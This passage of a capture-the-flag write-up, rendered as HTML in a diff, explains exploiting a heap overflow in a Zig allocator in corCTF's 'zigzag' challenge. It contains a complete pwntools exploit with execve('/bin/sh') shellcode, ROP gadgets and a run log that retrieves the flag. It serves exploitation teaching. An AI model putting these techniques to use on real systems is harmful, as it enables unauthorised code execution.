+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">@</span>memset(<span style="color:#ff79c6">@</span><span style="color:#ff79c6">as</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span>]<span style="color:#8be9fd">u8</span>, ptr.usedBits(<span style="color:#bd93f9">0</span>)), <span style="color:#bd93f9">0</span>, usedBitsCount(size_class));
+    <span style="color:#ff79c6">return</span> ptr;
+}
+</code></pre></div><p>It allocates a page to store objects in, then it allocates the <code>BucketHeader</code> itself. Note that the page allocator will make allocations adjacent from each other. According to my several experiments the allocations grow &ndash; from an initial given mapping &ndash; to lower or higher addresses. I advice you to try different order of allocations in gdb to figure out this.</p>
+<p>Let&rsquo;s quickly decribe each field of the <code>BucketHeader</code>:</p>
+<ul>
+<li><code>.prev</code> and <code>.next</code> keep track of the doubly linked list that links buckets of same size.</li>
+<li><code>.page</code> contains the base address of the page that contains the objects that belong to the bucket.</li>
+<li><code>alloc_cursor</code> contains the number of allocated objects.</li>
+<li><code>used_count</code> contains the number of currently used objects.</li>
+</ul>
+<h2 id="getting-read--write-what-were-primitive">Getting read / write what were primitive</h2>
+<p>Well, the goal is to an arbitrary read / write by hiijacking the <code>.page</code> and <code>.alloc_cursor</code> fields of the <code>BucketHeader</code>, this way if we hiijack pointers from a currently used bucket for a given size we can get a chunk toward any location.</p>
+<p>What we can do to get a chunk close to a  <code>BucketHeader</code> structure would be:</p>
+<ul>
+<li>Allocate large (<code>0x500-1</code>) chunk, <code>0x800</code> bucket.</li>
+<li>Allocate 4 other chunks of size <code>1000</code>, which end up in the <code>0x400</code> bucket.</li>
+</ul>
+<p>Thus, first one page has been allocated to satisfy request one, then another page right after the other has been allocated to store the <code>BucketHeader</code> for this bucket.
+Then, to satisfy the four next allocations, the page that stores the objects has been allocated right after the one which stores the <code>BucketHeader</code> of the <code>0x800</code>-bucket, and finally a page is allocated to store the <code>BucketHeader</code> of the <code>0x400</code> bucket.</p>
+<p>If you do not understand clearly, I advice you to debug my exploit in <code>gdb</code> by looking at the <code>chunklist</code>.</p>
+<p>With this process the last allocated <code>0x400</code>-sized chunk gets allocated <code>0x400</code> bytes before the <code>BucketHeader</code> of the bucket that handles <code>0x400</code>-sized chunks.
+Thus to get a read / write what were we can simply trigger the heap overflow with the <code>edit</code> function to null out <code>.alloc_cursor</code> and <code>.used_count</code> and replace <code>.page</code> by the target location.
+This way the next allocation that will request <code>0x400</code> bytes, which will trigger the hiijacked bucket and return the target location giving us the primitive.</p>
+<p>Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">alloc(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x500</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span>)
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">5</span>):
+    alloc(i, <span style="color:#bd93f9">1000</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;vv&#34;</span>)
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;X&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> \ <span style="color:#6272a4"># padding</span>
+     <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> \ <span style="color:#6272a4"># next / prev + .page point toward the target =&gt; 0x208000</span>
+     <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>) \ <span style="color:#6272a4"># .alloc_cursor &amp; .used_count</span>
+     <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)) <span style="color:#6272a4"># used bits</span>
+
+<span style="color:#6272a4"># next alloc(1000) will trigger the write what were</span>
+</code></pre></div><h2 id="leak-stack">Leak stack</h2>
+<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can base used as a base compared with function&rsquo;s stackframes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">alloc(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">1000</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span>) <span style="color:#6272a4"># get chunk into target location (0x208000)</span>
+show(<span style="color:#bd93f9">5</span>)
+io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># argv is located at 0x208000 + 0x100</span>
+
+stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>))
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</code></pre></div><h2 id="rop">ROP</h2>
+<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
+But the issue is that between the call to <code>SYS_read</code> within <code>std.fs.file.File.read</code> and the end of the function, variables that belong to the calling function&rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:</p>
+<pre tabindex="0"><code>0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
+</code></pre><p>With the use of this gadget I&rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
+The goal for the ROPchain is to <code>mptotect</code> a shellcode and then jump on it. The issue is that I didn&rsquo;t find a gadget to control the value of the <code>rdx</code> register but when it returns from <code>std.fs.file.File.read</code> it contains the value of size given to <code>edit</code>. So to call <code>mprotect(rdi=0x208000, rsi=0x1000, rdx=0x7)</code> we have to call <code>edit</code> with a size of <code>7</code> to write on the <code>std.fs.file.File.read</code> saved RIP the value of the magic gadget seen previously.</p>
+<p>Here is the ROPchain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x000</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+<span style="color:#6272a4"># with the use of the write what were we write the shellcode at 0x208000</span>
+
+shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#f1fa8c">&#34;</span>
+<span style="color:#6272a4"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>
+
+alloc(<span style="color:#bd93f9">14</span>, <span style="color:#bd93f9">1000</span>, shellcode)
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x0000000000201fcf : pop rax ; syscall
+</span><span style="color:#f1fa8c">0x0000000000203147 : pop rdi ; ret
+</span><span style="color:#f1fa8c">0x000000000020351b : pop rsi ; ret
+</span><span style="color:#f1fa8c">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
+</span><span style="color:#f1fa8c">0x0000000000201e09 : ret
+</span><span style="color:#f1fa8c">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(stack<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x50</span>)<span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+<span style="color:#6272a4"># write ROPchain into the safe area on the stack </span>
+alloc(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x400</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x203147</span>) \ <span style="color:#6272a4"># pop rdi ; ret</span>
+        <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>) <span style="color:#ff79c6">+</span> \ <span style="color:#6272a4"># target area for the shellcode</span>
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x20351b</span>) <span style="color:#ff79c6">+</span> \ <span style="color:#6272a4"># pop rsi ; ret</span>
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x1000</span>) <span style="color:#ff79c6">+</span> \ <span style="color:#6272a4"># length</span>
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x201fcf</span>) <span style="color:#ff79c6">+</span> \ <span style="color:#6272a4"># pop rax ; syscall</span>
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xa</span>) <span style="color:#ff79c6">+</span> \ <span style="color:#6272a4"># SYS_mprotect</span>
+        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>)) <span style="color:#6272a4"># jump on the shellcode + PROFIT</span>
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(stack<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xd0</span>)<span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+
+alloc(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">1000</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x202d16</span>)) <span style="color:#6272a4"># valid return address</span>
+edit(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">0x7</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0000000000203715</span>)) <span style="color:#6272a4"># magic gadget</span>
+
+io<span style="color:#ff79c6">.</span>interactive()
+</code></pre></div><h2 id="profit">PROFIT</h2>
+<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
+[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x200000)
+[+] Opening connection to be.ax on port 31278: Done
+[*] stack: 0x7ffc2ca48ae8
+[*] Loaded 37 cached gadgets for 'zigzag'
+[*] Using sigreturn for 'SYS_execve'
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls
+flag.txt
+zigzag
+$ cat flag.txt
+corctf{bl4Z1nGlY_f4sT!!}
+</code></pre><h2 id="appendices">Appendices</h2>
+<p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfmate</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;zigzag&#39;</span>)
+<span style="color:#6272a4"># pwn.context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;] </span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source ~/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+io <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
+
+io <span style="color:#ff79c6">=</span> start()
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">alloc</span>(idx, size, data):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Size: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Data: &#34;</span>, data)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">delete</span>(idx):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>(idx):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(idx, size, data):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;4&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Size: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Data: &#34;</span>, data)
+
+alloc(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x500</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span>)
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">5</span>):
+    alloc(i, <span style="color:#bd93f9">1000</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;vv&#34;</span>)
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;X&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x000</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+
+alloc(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">1000</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span>)
+show(<span style="color:#bd93f9">5</span>)
+io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x100</span>)
+
+stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>))
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x000</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+
+shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#f1fa8c">&#34;</span>
+
+alloc(<span style="color:#bd93f9">14</span>, <span style="color:#bd93f9">1000</span>, shellcode)
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x0000000000201fcf : pop rax ; syscall
+</span><span style="color:#f1fa8c">0x0000000000203147 : pop rdi ; ret
+</span><span style="color:#f1fa8c">0x000000000020351b : pop rsi ; ret
+</span><span style="color:#f1fa8c">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
+</span><span style="color:#f1fa8c">0x0000000000201e09 : ret
+</span><span style="color:#f1fa8c">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(exe)
+binsh <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x208000</span><span style="color:#ff79c6">+</span>(<span style="color:#bd93f9">48</span>)
+rop<span style="color:#ff79c6">.</span>execve(binsh, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(stack<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x50</span>)<span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+alloc(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x400</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x203147</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x20351b</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x1000</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x201fcf</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xa</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x208000</span>))
+
+edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(stack<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xd0</span>)<span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>))
+
+alloc(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">1000</span>,pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x202d16</span>))
+edit(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">0x7</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0000000000203715</span>))
+
+io<span style="color:#ff79c6">.</span>interactive()
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
+</span><span style="color:#f1fa8c">[*] &#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&#39;
+</span><span style="color:#f1fa8c">    Arch:     amd64-64-little
+</span><span style="color:#f1fa8c">    RELRO:    No RELRO
+</span><span style="color:#f1fa8c">    Stack:    No canary found
+</span><span style="color:#f1fa8c">    NX:       NX enabled
+</span><span style="color:#f1fa8c">    PIE:      No PIE (0x200000)
+</span><span style="color:#f1fa8c">[+] Opening connection to be.ax on port 31278: Done
